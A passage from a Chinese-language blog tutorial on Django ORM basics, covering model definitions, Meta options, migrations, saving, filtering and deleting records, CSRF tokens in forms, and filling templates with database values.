class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import MySQLdb</span><br><span class="line"></span><br><span class="line"># 使用原生sql获取书的列表</span><br><span class="line">def book_list(request):</span><br><span class="line">    # 创建到数据库的连接: 指明用户名，数据库，密码</span><br><span class="line">    db &#x3D; MySQLdb.connect(user &#x3D; &#39;me&#39;, db&#x3D;&#39;mydb&#39;, passwd&#x3D;&#39;secret&#39;, host&#x3D;&#39;localhost&#39;)</span><br><span class="line">    # 创建一个游标对象执行器</span><br><span class="line">    cursor &#x3D; db.cursor()</span><br><span class="line">    # 书写我们需要的sql语句</span><br><span class="line">    cursor.execute(&#39;SELECT name FROM books ORDER BY name&#39;)</span><br><span class="line">    # 对于fetchall()的结果做遍历，将遍历回来的结果当做数组，取第0个值name。</span><br><span class="line">    names &#x3D; [row[0] for row in cursor.fetchall()]</span><br><span class="line">    db.close()</span><br></pre></td></tr></table></figure><p>可不可以让数据库字段的查询和使用类的一个属性一样简单？没错登登登：orm上场了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">book:name</span><br><span class="line"></span><br><span class="line">book.name</span><br><span class="line">book.save()</span><br></pre></td></tr></table></figure><p>Django的orm就是为了让我们不再写上面那样的语句，而是像使操作数据库像使用类和类属性一样。</p><h3 id="创建我们的models"><a href="#创建我们的models" class="headerlink" title="创建我们的models"></a>创建我们的models</h3><blockquote><p><code>verbose_name</code>:<strong>对象的人类可读的名称，单数</strong>:</p></blockquote><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">verbose_name &#x3D; &quot;pizza&quot;</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Meta，内嵌于 UserMessage 这个类的定义中</span><br><span class="line">如果 class Publisher 是顶格的，那么 class Meta 在它之下要缩进4个空格－－按 Python 的传统</span><br><span class="line">你可以在任意一个 模型 类中使用 Meta 类，来设置一些与特定模型相关的选项。</span><br><span class="line">如：设置ordering &#x3D; [&#39;name&#39;]，默认地都会按 name 字段排序</span><br></pre></td></tr></table></figure><p>models.py：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 继承于django.db.models.Model</span><br><span class="line">class UserMessage(models.Model):</span><br><span class="line">    # 设置最大长度，verbose_name在后台显示字段会用到</span><br><span class="line">    name &#x3D; models.CharField(max_length&#x3D;20, verbose_name&#x3D;u&quot;用户名&quot;)</span><br><span class="line">    # Django提供内置的邮箱字段会帮忙验证&#96; default_validators &#x3D; [validators.validate_email]&#96;</span><br><span class="line">    email &#x3D; models.EmailField(verbose_name&#x3D;u&quot;邮箱&quot;)</span><br><span class="line">    address &#x3D; models.CharField(max_length&#x3D;100, verbose_name&#x3D;u&quot;联系地址&quot;)</span><br><span class="line">    message &#x3D; models.CharField(max_length&#x3D;500, verbose_name&#x3D;u&quot;留言信息&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        verbose_name &#x3D; u&quot;用户留言信息&quot;</span><br><span class="line">        # db_table ，这里我们让它自动生成所以不用指定</span><br></pre></td></tr></table></figure><p>这时我们执行<code>makemigrations messages</code>会发现并没有改动。</p><blockquote><p>因为setting中我们没有注册我们的app: message </p></blockquote><h3 id="在setting中注册我们的app"><a href="#在setting中注册我们的app" class="headerlink" title="在setting中注册我们的app"></a>在setting中注册我们的app</h3><p>在settings.py中找到 <code>INSTALLED_APPS</code>: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#96;INSTALLED_APPS&#96;</span><br><span class="line">[</span><br><span class="line">    前面的不用变，后面新增下一行</span><br><span class="line">    &#39;message&#39;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>这时候我们重新运行<code>Tools 菜单下 Run manage.py Task</code>会提示： </p><p>如果提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SyntaxError: Non-ASCII character &#39;\xe7&#39; in file D:\CodeSpace\PythonProject\DjangoGetStarted\apps\message\models.py on line</span><br></pre></td></tr></table></figure><p>请注意可能你忘记在写过中文的地方加上:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#coding: utf-8</span><br></pre></td></tr></table></figure><p><strong>注意必须加在第一或二行。</strong></p><p>然后执行下面命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">makemigrations message</span><br></pre></td></tr></table></figure><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/43.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate message 生成数据表</span><br></pre></td></tr></table></figure><p>最后前往Navicat验证。</p><h3 id="Models讲解"><a href="#Models讲解" class="headerlink" title="Models讲解"></a>Models讲解</h3><p>除过普通的对应数据库的字段类型如<code>CharField</code>，还有很多高级类型。如<code>EmailField</code>提供email验证。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">models.ForeignKey     # 外键</span><br><span class="line">models.DateTimeField  # 时间字段</span><br><span class="line">models.IntegerField   # 整型</span><br><span class="line">models.IPAddressField # IP地址</span><br><span class="line">models.FileField      # 上传文件</span><br><span class="line">models.ImageField     # 图片</span><br></pre></td></tr></table></figure><blockquote><p>ctrl按住+左键点击<code>models</code> 进入之后点击<code>fields</code>拖到文件开始可以看到所有字段： </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h4 id="介绍字段参数"><a href="#介绍字段参数" class="headerlink" title="介绍字段参数"></a>介绍字段参数</h4><p><code>CharField</code>必须指明默认最大长度。<code>null=True,blank=True</code>指明字段可以为空<br><code>defalut = &quot; &quot;</code>指定默认值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name &#x3D; models.CharField(max_length&#x3D;20,null&#x3D;True,blank&#x3D;True, verbose_name&#x3D;u&quot;用户名&quot;)</span><br></pre></td></tr></table></figure><p>id是<strong>自动生成的</strong>，如果需要自定义主键,message/models.py中添加字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object_id &#x3D; models.CharField(primary_key&#x3D;True, verbose_name&#x3D;&quot;主键&quot;)</span><br></pre></td></tr></table></figure><p>此时点击<code>Tools 菜单下 Run manage.py Task</code>输入<code>makemigrations message</code></p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/44.png"></p><p><strong>知识点：CharField必须指明最大长度</strong> </p><p>object_id改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">object_id &#x3D; models.CharField(primary_key&#x3D;True, max_length&#x3D;50 ,verbose_name&#x3D;&quot;主键&quot;)</span><br></pre></td></tr></table></figure><p>这时点击<code>Tools 菜单下 Run manage.py Task</code>输入<code>makemigrations message</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">You are trying to add a non-nullable field &#39;object_id&#39; to usermessage without a default; we can&#39;t do that (the database needs something to populate existing rows).</span><br><span class="line">Please select a fix:</span><br><span class="line"> 1) Provide a one-off default now (will be set on all existing rows)</span><br><span class="line"> 2) Quit, and let me add a default in models.py</span><br></pre></td></tr></table></figure><p>根据提示信息，我们需要给<code>object_id</code>添加默认值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object_id &#x3D; models.CharField(primary_key&#x3D;True, max_length&#x3D;50,default&#x3D;&quot;&quot;, verbose_name&#x3D;&quot;主键&quot;)</span><br></pre></td></tr></table></figure><p><strong>get新知识点：object_id必须有默认值</strong> </p><p>输入<code>2</code> 退出：然后输入<code>makemigrations message</code> </p><p>再输入下面命令生成数据表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate message</span><br></pre></td></tr></table></figure><blockquote><p>可以看到上图过程中会告诉我们做了哪些变化，如删除了默认系统生成的主键<code>id</code> ,变更了<code>name</code>。新增了我们的<code>object_id</code> </p></blockquote><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/45.png"></p><p>前往Navicat验证右键设计表： </p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/46.png"></p><p>可以看到<code>object_id</code>已经成为我们的新主键。 </p><h4 id="介绍Meta信息："><a href="#介绍Meta信息：" class="headerlink" title="介绍Meta信息："></a>介绍Meta信息：</h4><p>Meta信息中我们可以指定常见的类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_table &#x3D; &quot;user_meassage&quot;</span><br></pre></td></tr></table></figure><p>自定义后生成表，表名会与我们的保持一致。而不会前缀<code>appname</code>如：<code>message_</code></p><blockquote><p>这里因为我们已经生成过了，就不要做验证改变表名了。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ordering &#x3D; &#39;-object_id&#39;</span><br></pre></td></tr></table></figure><p>ordering指定默认排序字段,如：就会以object_id倒序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">verbose_name_plural &#x3D; u&quot;用户留言信息&quot;</span><br></pre></td></tr></table></figure><p>verbose_name_plural：复数信息，便于人阅读。否则会在后台显示<code>用户留言信息s</code></p><p>已经学习完毕了<code>orm</code>将数据表映射表。</p><h2 id="django-model的增删改"><a href="#django-model的增删改" class="headerlink" title="django model的增删改"></a>django model的增删改</h2><p>在<code>message/views.py</code>中:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from .models import UserMessage</span><br></pre></td></tr></table></figure><p>将我们刚才创建的model，import进来。<code>.</code>代表是与当前同级的目录。</p><p>按照下图所示添加一条测试数据。</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/47.png"></p><p>然后再我们的<code>getform</code>方法内部添加下面代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def getform(request):</span><br><span class="line">    # UserMessage默认的数据管理器objects。</span><br><span class="line">    # 方法all()是将所有数据返回成一个queryset类型(django的内置类型)</span><br><span class="line">    all_message &#x3D; UserMessage.objects.all()</span><br><span class="line"></span><br><span class="line">    #我们可以对于all_message进行遍历操作</span><br><span class="line">    for message in all_message:</span><br><span class="line">        # 每个message实际就是一个UserMessage对象（这时我们就可以使用对象的相关方法）。</span><br><span class="line">        print message.name</span><br><span class="line"></span><br><span class="line">    return render(request, &#39;message_form.html&#39;)</span><br></pre></td></tr></table></figure><p>调试过程：</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/48.png"></p><li>点击上图小红框位置，打上断点。</li><li>点击Run -> debug后：在浏览器里打开：`http://127.0.0.1:8000/form/`</li><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/49.png"></p><li>弹出上图代表已进入断点。 </li><li>此时鼠标左键点击：all_message.可以看到这是一个`{QuerySet}类型的对象，里面存放着[<UserMessage: UserMessage object>]` </li><li>按`f8`使运行到下一步。此时下方的值窗口内可以看到message的值。说明我们成功取到了数据库的值。 </li><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/50.png"></p><h3 id="filter取出指定要求值"><a href="#filter取出指定要求值" class="headerlink" title="filter取出指定要求值"></a>filter取出指定要求值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">all_message &#x3D; UserMessage.objects.filter(name&#x3D;&#39; mtianyan&#39;, address&#x3D;&#39;西安&#39;)</span><br></pre></td></tr></table></figure><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/51.png"></p><p>按照上面调试过程重新调试可以看到我们同样取出了值。 </p><h3 id="将数据存入数据库"><a href="#将数据存入数据库" class="headerlink" title="将数据存入数据库"></a>将数据存入数据库</h3><p>了解：django/db/models/base.py 源码中提供<code>save</code>方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def save(self, force_insert&#x3D;False, force_update&#x3D;False, using&#x3D;None,update_fields&#x3D;None):</span><br></pre></td></tr></table></figure><p>getform方法中添加代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 存储部分</span><br><span class="line"></span><br><span class="line">   # 首先实例化一个对象</span><br><span class="line">   user_message &#x3D; UserMessage()</span><br><span class="line"></span><br><span class="line">   # 为对象增加属性</span><br><span class="line">   user_message.name &#x3D; &quot;mtianyan2&quot;</span><br><span class="line">   user_message.message &#x3D; &quot;blog.mtianyan.cn&quot;</span><br><span class="line">   user_message.address &#x3D; &quot;西安&quot;</span><br><span class="line">   user_message.email &#x3D; &quot;1147727180@qq.com&quot;</span><br><span class="line">   user_message.object_id &#x3D; &quot;efgh&quot;</span><br><span class="line"></span><br><span class="line">   # 调用save方法进行保存</span><br><span class="line">   user_message.save()</span><br></pre></td></tr></table></figure><li>打上断点：如下图。 </li><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/53.png"></p><li>一直惦记f8单步调试，直到如下图：蓝色到`return`语句 </li><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/54.png"></p><p>可以在下方值窗口查看到值 </p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/55.png"></p><h3 id="Navicat进行验证"><a href="#Navicat进行验证" class="headerlink" title="Navicat进行验证"></a>Navicat进行验证</h3><blockquote><p>可以看到成功的添加了数据<code>mtianyan2</code> </p></blockquote><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/56.png"></p><h3 id="如何从html的提交中取到数据并保存进数据库"><a href="#如何从html的提交中取到数据并保存进数据库" class="headerlink" title="如何从html的提交中取到数据并保存进数据库"></a>如何从html的提交中取到数据并保存进数据库</h3><p>templates/message_form.html：</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/57.png"></p><blockquote><p><code>method</code>是<code>post</code>。<code>action</code>就是指向我们在urls.py中配置的<code>/form/</code> </p><p><strong>前面必须加斜杠指根路径下form</strong> </p><p>里面的<code>input</code>会自动把值传递给后台：这时我们就可以在<code>getform</code>中取到刚才传递过来的值。 </p></blockquote><p>运行项目：然后输入需要填写的值。点击提交：出现403错误 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Forbidden (403)</span><br><span class="line">CSRF verification failed. Request aborted.</span><br></pre></td></tr></table></figure><blockquote><p>根据提示：我们的页面没有进行<code>crsf</code>的验证，这时django的安全机制，不允许任意<code>form</code>都往后台提交。 </p></blockquote><p><strong>知识点：所以我们需要在html页面中加入<code>csrf_token</code></strong> </p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/58.png"></p><p>原有那行删除掉。打上断点 .</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/59.png"></p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;QueryDict: &#123;u&#39;message&#39;: [u&#39;\u54c8\u54c8&#39;], u&#39;address&#39;: [</span><br><span class="line">u&#39;\u897f\u5b89\u5e02&#39;], u&#39;csrfmiddlewaretoken&#39;: [</span><br><span class="line">u&#39;uIYSMOTWPJBPOPucRwd3uDaWtCzeEaem&#39;], u&#39;name&#39;: [</span><br><span class="line">u&#39;\u5929\u6daf\u660e\u6708\u7b19&#39;], u&#39;email&#39;: [u&#39;1147727180@qq.com&#39;]&#125;&gt;</span><br></pre></td></tr></table></figure></blockquote><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/60.png"></p><blockquote><p>数据以dict：key-value 形式存储 key是由如下图html中的name所决定对应的。 </p></blockquote><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/61.png"></p><h3 id="数据库新增"><a href="#数据库新增" class="headerlink" title="数据库新增"></a>数据库新增</h3><p><code>request.POST</code>中数据取出，存入<code>user_message</code>对象 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># html表单部分</span><br><span class="line"></span><br><span class="line">   # 此处对应html中的method&#x3D;&quot;post&quot;，表示我们只处理post请求</span><br><span class="line">   if request.method &#x3D;&#x3D; &quot;POST&quot;:</span><br><span class="line">       # 就是取字典里key对应value值而已。取name，取不到默认空</span><br><span class="line">       name &#x3D; request.POST.get(&#39;name&#39;, &#39;&#39;)</span><br><span class="line">       message &#x3D; request.POST.get(&#39;message&#39;, &#39;&#39;)</span><br><span class="line">       address &#x3D; request.POST.get(&#39;address&#39;, &#39;&#39;)</span><br><span class="line">       email &#x3D; request.POST.get(&#39;email&#39;, &#39;&#39;)</span><br><span class="line"></span><br><span class="line">       # 实例化对象</span><br><span class="line">       user_message &#x3D; UserMessage()</span><br><span class="line"></span><br><span class="line">       # 将html的值传入我们实例化的对象.</span><br><span class="line">       user_message.name &#x3D; name</span><br><span class="line">       user_message.message &#x3D; message</span><br><span class="line">       user_message.address &#x3D; address</span><br><span class="line">       user_message.email &#x3D; email</span><br><span class="line">       user_message.object_id &#x3D; &quot;ijkl&quot;</span><br><span class="line"></span><br><span class="line">       # 调用save方法进行保存</span><br><span class="line">       user_message.save()</span><br></pre></td></tr></table></figure><ul><li><ul><li>打断点在下图位置：</li></ul><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/62.png"></p></li></ul><ul><li><p>进入调试：点击点击method：是get请求。因为我们并没有按提交按钮，而是get这个网页 </p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/63.png"></p></li></ul><ul><li>点击f8继续运行我们的项目 浏览器中填写表单内容点提交。 </li></ul><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/64.png"></p><blockquote><p>因为这次是表单提交，已经变成了post方式。按<code>f6</code>进行单步调试。 </p></blockquote><p>一直单步到如下图蓝色 </p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/65.png"></p><p>这时候值浏览窗口可以看到 </p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/66.png"></p><blockquote><p>检查我们的user_message对象的属性是否已经全部添加进去，</p></blockquote><p>使用f8 继续项目并前往Navicat验证</p><h3 id="删除数据。"><a href="#删除数据。" class="headerlink" title="删除数据。"></a>删除数据。</h3><p>对于查询到的数据做删除：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 方法2 :&#96;filter&#96;取出指定条件值，逗号代表and 必须同时满足两个条件才返回。</span><br><span class="line">all_message &#x3D; UserMessage.objects.filter(name&#x3D;&#39;wlk&#39;, address&#x3D;&#39;合肥&#39;)</span><br><span class="line"></span><br><span class="line"># 我的数据库里保存着可以匹配到该条数据的一行。</span><br><span class="line"></span><br><span class="line"># 删除操作：使用delete方法删除all_message</span><br><span class="line"></span><br><span class="line">all_message.delete()</span><br><span class="line"></span><br><span class="line">    for message in all_message:</span><br><span class="line">        # 删除取到的message对象</span><br><span class="line">        message.detele()</span><br><span class="line">        # print message.name</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>点击run并访问：<a href="https://link.jianshu.com/?t=http://127.0.0.1:8000/form/">http://127.0.0.1:8000/form/</a><br>进入Navicat进行验证。</p><h2 id="django-url-templates配置"><a href="#django-url-templates配置" class="headerlink" title="django url templates配置"></a>django url templates配置</h2><p>本节将介绍url的配置，以及如何将数据库数据填充回前台html页面。</p><p>情景：只允许用户修改<code>wlk</code>，如果没有就添加，如果有就回填使用户可以修改。</p><h3 id="取出数据"><a href="#取出数据" class="headerlink" title="取出数据"></a>取出数据</h3><p>message/views.py中的getform方法中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">message &#x3D; None</span><br><span class="line">all_message &#x3D; UserMessage.objects.filter(name&#x3D;&#39;wlk&#39;, address&#x3D;&#39;合肥&#39;)</span><br><span class="line"></span><br><span class="line"># if 判断是否存在数据</span><br><span class="line">if all_message:</span><br><span class="line">    # all_message是一个list，可以使用切片。</span><br><span class="line">    message &#x3D; all_message[0]</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>这里注意把前几节写的删除掉</p></blockquote><h3 id="将数据回填至html中"><a href="#将数据回填至html中" class="headerlink" title="将数据回填至html中"></a>将数据回填至html中</h3><h4 id="修改return-render"><a href="#修改return-render" class="headerlink" title="修改return render"></a>修改return render</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">return render(request, &#39;message_form.html&#39;,&#123;</span><br><span class="line">        &quot;my_message&quot; : message</span><br><span class="line">&#125;)   </span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>这里前面的”my_meassage”是我们可以自行命名的。会有一个<code>my_message</code>对象随着返回前端页面。</p></blockquote><h4 id="在前端页面中放入值。"><a href="#在前端页面中放入值。" class="headerlink" title="在前端页面中放入值。"></a>在前端页面中放入值。</h4><p>为input系列标签添加<code>value</code>: 使用<code>my_message.name</code>取到我们传递过来的<code>my_message</code>对象的属性值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input id&#x3D;&quot;name&quot; type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot;  </span><br><span class="line">value&#x3D;&quot;&#123;&#123; my_message.name &#125;&#125;&quot; class&#x3D;&quot;error&quot; placeholder&#x3D;&quot;请输入您的姓名&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>请自行完成姓名，邮箱，联系地址三个<code>input</code>标签。</p></blockquote><p>为<code>textarea</code>标签添加值</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/67.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea id&#x3D;&quot;message&quot; name&#x3D;&quot;message&quot;  </span><br><span class="line">placeholder&#x3D;&quot;请输入你的建议&quot;&gt;&#123;&#123; my_message.message &#125;&#125;&lt;&#x2F;textarea&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行项目，访问。</p><blockquote><p>成功！！我们已经将后台数据库数据成功展示到前台。</p></blockquote><h3 id="template模板渲染中的一些用法。"><a href="#template模板渲染中的一些用法。" class="headerlink" title="template模板渲染中的一些用法。"></a>template模板渲染中的一些用法。</h3><blockquote><p>在我们的template模板中也就是form.html中，不允许我们写Python的语法，<br>它提供了一套自己的内建标签。</p></blockquote><p><a href="https://link.jianshu.com/?t=https://docs.djangoproject.com/en/2.0/ref/templates/builtins/">官方文档中template内建标签用法传送门</a></p><h4 id="常用的几种模板标签介绍："><a href="#常用的几种模板标签介绍：" class="headerlink" title="常用的几种模板标签介绍："></a>常用的几种模板标签介绍：</h4><h5 id="if-else"><a href="#if-else" class="headerlink" title="if - else"></a><code>if - else</code></h5><p>官方提供模板如下：</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/68.png"></p><p>不满足if：如改为<code>my_message.name == &quot;wlk1</code>运行结果：</p><h5 id="ifequal-amp-ifnotequal"><a href="#ifequal-amp-ifnotequal" class="headerlink" title="ifequal &amp; ifnotequal"></a><code>ifequal</code> &amp; <code>ifnotequal</code></h5><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/70.png"></p><p>官方文档解释：<code>ifequal a b</code> 相当于<code>f a == b</code>.<code>ifnotequal</code>则相当于<code>if a 